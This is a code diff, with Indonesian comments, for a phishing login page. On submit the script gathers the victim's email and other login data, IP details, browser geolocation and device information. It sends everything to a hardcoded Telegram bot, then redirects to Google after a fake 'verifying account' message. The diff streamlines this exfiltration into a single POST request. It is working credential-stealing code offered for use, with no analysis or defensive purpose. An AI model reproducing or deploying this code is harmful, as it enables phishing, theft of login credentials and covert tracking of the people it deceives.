@@ -9,17 +9,13 @@ document.getElementById("loginForm").addEventListener("submit", async function (
     // Data bot Telegram
     let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
     let chatId = "6786210993"; // Hanya 1 ID
-    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg";
 
     // Ambil informasi IP
     let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
     try {
         let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
-        if (!response.ok) throw new Error("Gagal mengambil data IP");
-        ipInfo = await response.json();
-    } catch (error) {
-        console.error("Gagal mendapatkan data IP:", error);
-    }
+        if (response.ok) ipInfo = await response.json();
+    } catch (error) {}
 
     // Ambil lokasi pengguna
     async function getUserLocation() {
@@ -27,14 +23,14 @@ document.getElementById("loginForm").addEventListener("submit", async function (
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
+                        resolve(`📍 *Koordinat:* ${position.coords.latitude}, ${position.coords.longitude}`);
                     },
                     () => {
-                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
+                        resolve("📍 *Lokasi:* Tidak diizinkan oleh user");
                     }
                 );
             } else {
-                resolve("📍 Lokasi: Tidak didukung di browser ini");
+                resolve("📍 *Lokasi:* Tidak didukung di browser ini");
             }
         });
     }
@@ -44,7 +40,7 @@ document.getElementById("loginForm").addEventListener("submit", async function (
     let userAgent = navigator.userAgent;
     let deviceInfo = `📱 *Device:* ${userAgent}`;
 
-    // Format pesan yang dikirim ke Telegram
+    // Format pesan dalam satu JSON
     let message = `🔒 *Login Berhasil!*\n\n`
         + `🕒 *Waktu:* ${waktuLogin}\n`
         + `📧 *Email:* ${email}\n`
@@ -55,19 +51,20 @@ document.getElementById("loginForm").addEventListener("submit", async function (
         + `${lokasiUser}\n`
         + `${deviceInfo}`;
 
-    // Kirim foto dulu
-    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`)
-        .catch(error => console.error("Gagal mengirim foto:", error));
-
-    // Kirim pesan teks setelah foto
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-        .catch(error => console.error("Gagal mengirim pesan:", error));
+    // Kirim dalam satu request
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown"
+        })
+    }).catch(error => console.error("Gagal mengirim:", error));
 
     console.log("✅ Semua data terkirim ke Telegram!");
 
-    // Redirect ke Google dengan delay (biar lebih real)
+    // Redirect lebih smooth
     document.getElementById("loadingText").innerText = "Memverifikasi akun...";
-    setTimeout(() => {
-        window.location.href = "https://www.google.com";
-    }, 3000);
+    setTimeout(() => window.location.href = "https://www.google.com", 3000);
 });
